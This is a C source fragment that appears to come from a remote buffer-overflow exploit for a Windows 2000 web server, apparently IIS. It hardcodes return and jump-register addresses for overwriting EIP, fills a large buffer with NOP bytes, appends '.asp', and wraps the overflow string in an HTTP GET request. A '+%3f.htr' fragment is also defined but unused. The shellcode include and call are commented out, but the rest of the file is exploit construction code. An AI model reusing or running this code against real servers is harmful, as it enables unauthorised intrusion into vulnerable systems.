

//#include "getshellcode.c"




int  getoverbuff(char *overbuff)
{

 //*********************************************************************************************
  char  eipjmpespwin2000tw[]="\xb6\x37\xfc\x7f"; //"\xc1\x63\xfa\x7f"; //"\x33\x75\x18\x00";//
  char  eipretwin2000tw[]="\xb7\x37\xfc\x7f"; 
  char  eipjmpebxwin2000tw[]="\xbc\x36\xfc\x7f"; //"\xc1\x63\xfa\x7f"; //"\x33\x75\x18\x00";//
  char  eipjmpeaxwin2000tw[]="\x2e\x36\xfc\x7f"; //"\xc1\x63\xfa\x7f"; //"\x33\x75\x18\x00";//
  
  char  *eipretwin2000add=eipretwin2000tw;
  char  *eipjmpespwin2000add=eipjmpespwin2000tw;
  char  *eipjmpebxwin2000add=eipjmpebxwin2000tw;
  char  *eipjmpeaxwin2000add=eipjmpeaxwin2000tw;

  //*********************************************************************************************

  
  #define  RETEIPADDRESS 0x100
  char  jmpshell[]="BBBB\xff\x63\x78";
  char  buff[BUFFSIZE];
  int   i;

  memset(buff,NOPCODE,BUFFSIZE);
  strcpy(buff+0x10000-4,".asp");
  strcpy(overbuff,buff);
  return strlen(buff);
}


int  GetOverStr(char *buffer,char *server,char *urlfile,int offset)
{

  char    shellcodebuff[BUFFSIZE];
  char    overbuff[BUFFSIZE];
  int     postbytes;
  char    *url="/test.php";
  char    *htr="+%3f.htr";

  char    overstr[]="GET %s%s HTTP/1.1\r\nHOST:%s\r\nContent-Type: text/html\r\n\r\n";
 
  if(urlfile!=NULL) url=urlfile;
  getoverbuff(overbuff);
 // postbytes=GetShellcode(shellcodebuff);
  _snprintf(buffer,BUFFSIZE,overstr,url,overbuff,server);
  return (strlen(buffer));
}